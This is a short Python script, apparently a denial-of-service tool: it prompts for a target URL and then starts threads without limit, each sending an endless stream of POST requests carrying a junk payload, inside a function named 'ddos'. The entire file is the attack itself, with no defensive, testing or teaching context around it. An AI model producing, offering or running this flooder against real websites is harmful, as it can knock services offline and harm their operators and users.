import threading
import requests


URL = input("URL : ")

r = requests.get(URL)

payload = {"liunviusvufndsnvskjdfnvjnsdjfklnvjknsdjkfnvkljndsfjnvjkldnvkjnskdjfnvjknsdvjnfkljvnsljkfnvsdkjvnjkfdnjsdkvnslkfnvjlsnf":"khsdbvfhbfjhvbhdsfkjvbsdfjhvbkjsdhvbhsdfvbbshdhfvsdkhfvbkhfvbkhjsdbvhjbsdfhvbkjshdbfh"}



def ddos():
    while True:
        r = requests.post(URL, data=payload)

while True:
    threading.Thread(target=ddos).start()
